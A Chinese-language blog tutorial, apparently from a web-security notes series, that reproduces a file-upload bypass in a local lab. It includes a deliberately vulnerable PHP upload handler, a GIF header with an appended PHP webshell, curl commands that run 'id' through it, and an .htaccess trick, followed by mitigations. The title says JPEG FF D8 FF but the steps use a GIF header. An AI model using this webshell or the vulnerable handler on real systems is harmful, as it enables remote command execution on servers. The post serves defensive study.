---
title: "文件上传：FF D8 FF 前缀绕过"
slug: "php-upload-prefix-bypass"
date: 2026-08-28T21:02:26+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "在 PHP 木马前补上 JPEG 文件头，绕过 MIME 与内容检测。"
summary: "在 PHP 木马前补上 JPEG 文件头，绕过 MIME 与内容检测。"
tags: ["文件上传", "PHP", "绕过"]
categories: ["Web 安全"]
series: ["Web 安全笔记"]
weight: 3
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/web-security/5.文件上传漏洞.md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/php-upload-prefix-bypass/workflow.svg" alt="用合法图片头满足内容检测，再用解析配置让文件按 PHP 执行。" loading="lazy">
  <figcaption>图 1 · 文件上传文件头绕过。用合法图片头满足内容检测，再用解析配置让文件按 PHP 执行。</figcaption>
</figure>

## 1. 环境

创建 `/tmp/upload-prefix/index.php`：

```php
<?php
if (isset($_FILES['file'])) {
    $tmp = $_FILES['file']['tmp_name'];
    if (getimagesize($tmp) === false) {
        die('not an image');
    }

    $name = basename($_FILES['file']['name']);
    move_uploaded_file($tmp, __DIR__ . '/uploads/' . $name);
    echo "saved: /uploads/$name\n";
}
?>
<form method="post" enctype="multipart/form-data">
  <input type="file" name="file">
  <button>upload</button>
</form>
```

```bash
mkdir -p /tmp/upload-prefix/uploads
cd /tmp/upload-prefix
php -S 127.0.0.1:8080
```

## 2. 创建合法图片头

最小 GIF：

```bash
printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b' > /tmp/prefix.gif
printf '<?php echo shell_exec($_GET["cmd"]); ?>' >> /tmp/prefix.gif
cp /tmp/prefix.gif /tmp/prefix.php
```

先确认 `getimagesize`：

```bash
php -r 'var_dump(getimagesize("/tmp/prefix.php"));'
```

## 3. 上传并执行

```bash
curl -i -sS -F 'file=@/tmp/prefix.php' \
  'http://127.0.0.1:8080/'

curl -sS --get --data-urlencode 'cmd=id' \
  'http://127.0.0.1:8080/uploads/prefix.php'
```

预期返回 `id` 结果。

如果服务器只允许图片后缀，配合 `.htaccess`：

```apache
AddType application/x-httpd-php .jpg
```

## 4. 关键判断

| 检测项 | 是否足够 |
| --- | --- |
| MIME Header | 不够 |
| 文件头 / `getimagesize` | 不够 |
| 后缀黑名单 | 不够 |
| 上传目录不可执行 | 有效 |
| 重命名 + 白名单 + 隔离存储 | 有效 |

## 5. 排错

- `getimagesize` 失败：GIF 字节不完整；
- 上传成功但不能执行：目标目录禁用了 PHP；
- 后缀被改成 `.jpg`：需要找到 `.htaccess`、`.user.ini` 或其他解析配置；
- 命令无回显：先写无害 marker 或使用授权监听端。

## 6. 修复

- 白名单后缀和 MIME；
- 服务端重命名；
- 上传目录关闭 PHP 解析；
- 使用对象存储/独立域名；
- 对图片重新编码，剥离附加内容。
